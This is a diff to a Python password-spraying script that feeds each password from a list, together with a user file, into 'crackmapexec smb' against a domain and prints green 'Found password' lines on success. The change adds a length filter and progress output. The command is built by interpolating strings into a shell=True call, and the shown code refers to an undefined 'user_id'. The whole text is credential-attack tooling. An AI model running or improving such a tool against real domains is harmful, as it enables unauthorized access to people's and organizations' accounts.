@@ -40,8 +40,7 @@ def main():
 
     try:
         number_of_runs = 0
-        with open(args.user, 'r') as file_users:
-            user_lines = file_users.readlines()
+
         with open(args.password, 'r') as file_passwords:
             pass_lines = file_passwords.readlines()
 
@@ -51,12 +50,20 @@ def main():
         for pass_idx, pass_line in enumerate(pass_lines):
             password = pass_line.strip()
 
+            if len(password) < pass_length:
+                print(f"\n[-] Skipping password '{password}' (length < {pass_length})")
+                continue
+
+            print(f"\n[+] Testing password {pass_idx + 1}/{len(pass_lines)}: '{password}' ...")
             cme_command = f"crackmapexec smb '{domain_name}' -u $(cat {args.user}) -p '{password}' --continue-on-success"
             p = subprocess.Popen(cme_command, shell=True, stdout=subprocess.PIPE, text=True)
 
             for output_line in p.stdout:
-                print(output_line)
-                
+                if "[+]" in output_line:
+                    # print in green
+                    print("[+] Found password for" + "\033[32m {user} : {password}\033[0m".format(user=user_id, password=password))
+                    break
+
             number_of_runs = number_of_runs + 1
             p.stdout.close()
             p.wait()
